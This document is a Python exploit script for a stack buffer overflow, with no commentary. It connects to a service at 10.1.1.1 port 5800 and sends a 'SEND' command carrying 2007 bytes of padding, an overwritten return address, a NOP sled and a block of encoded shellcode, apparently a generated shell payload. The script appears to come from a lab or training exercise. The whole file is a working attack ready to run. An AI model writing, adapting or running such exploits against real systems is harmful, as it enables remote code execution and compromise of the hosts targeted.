import socket

IP = "10.1.1.1"
PORT = 5800

SHELLCODE = (
    "\xba\xb9\x1e\xb1\x4c\xda\xc7\xd9\x74\x24\xf4\x5f\x29\xc9"
    "\xb1\x52\x83\xef\xfc\x31\x57\x0e\x03\xee\x10\x53\xb9\xec"
    "\xc5\x11\x42\x0c\x16\x76\xca\xe9\x27\xb6\xa8\x7a\x17\x06"
    "\xba\x2e\x94\xed\xee\xda\x2f\x83\x26\xed\x98\x2e\x11\xc0"
    "\x19\x02\x61\x43\x9a\x59\xb6\xa3\xa3\x91\xcb\xa2\xe4\xcc"
    "\x26\xf6\xbd\x9b\x95\xe6\xca\xd6\x25\x8d\x81\xf7\x2d\x72"
    "\x51\xf9\x1c\x25\xe9\xa0\xbe\xc4\x3e\xd9\xf6\xde\x23\xe4"
    "\x41\x55\x97\x92\x53\xbf\xe9\x5b\xff\xfe\xc5\xa9\x01\xc7"
    "\xe2\x51\x74\x31\x11\xef\x8f\x86\x6b\x2b\x05\x1c\xcb\xb8"
    "\xbd\xf8\xed\x6d\x5b\x8b\xe2\xda\x2f\xd3\xe6\xdd\xfc\x68"
    "\x12\x55\x03\xbe\x92\x2d\x20\x1a\xfe\xf6\x49\x3b\x5a\x58"
    "\x75\x5b\x05\x05\xd3\x10\xa8\x52\x6e\x7b\xa5\x97\x43\x83"
    "\x35\xb0\xd4\xf0\x07\x1f\x4f\x9e\x2b\xe8\x49\x59\x4b\xc3"
    "\x2e\xf5\xb2\xec\x4e\xdc\x70\xb8\x1e\x76\x50\xc1\xf4\x86"
    "\x5d\x14\x5a\xd6\xf1\xc7\x1b\x86\xb1\xb7\xf3\xcc\x3d\xe7"
    "\xe4\xef\x97\x80\x8f\x0a\x70\xa5\x4e\x15\x82\xd1\x52\x15"
    "\x83\x9a\xda\xf3\xe9\xcc\x8a\xac\x85\x75\x97\x26\x37\x79"
    "\x0d\x43\x77\xf1\xa2\xb4\x36\xf2\xcf\xa6\xaf\xf2\x85\x94"
    "\x66\x0c\x30\xb0\xe5\x9f\xdf\x40\x63\xbc\x77\x17\x24\x72"
    "\x8e\xfd\xd8\x2d\x38\xe3\x20\xab\x03\xa7\xfe\x08\x8d\x26"
    "\x72\x34\xa9\x38\x4a\xb5\xf5\x6c\x02\xe0\xa3\xda\xe4\x5a"
    "\x02\xb4\xbe\x31\xcc\x50\x46\x7a\xcf\x26\x47\x57\xb9\xc6"
    "\xf6\x0e\xfc\xf9\x37\xc7\x08\x82\x25\x77\xf6\x59\xee\x97"
    "\x15\x4b\x1b\x30\x80\x1e\xa6\x5d\x33\xf5\xe5\x5b\xb0\xff"
    "\x95\x9f\xa8\x8a\x90\xe4\x6e\x67\xe9\x75\x1b\x87\x5e\x75"
    "\x0e"
)

def exploit():
    shellcode_bytes = SHELLCODE.encode('latin-1')
    
    payload = (
        b"A" * 2007 +
        b"\xa0\x12\x50\x62" +
        b"\x90" * 32 +
        shellcode_bytes
    )
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IP, PORT))
        s.recv(1024)
        print("Sending payload...")
        s.sendall(b"SEND " + payload + b"\r\n")
    print("Done")

if __name__ == "__main__":
    exploit()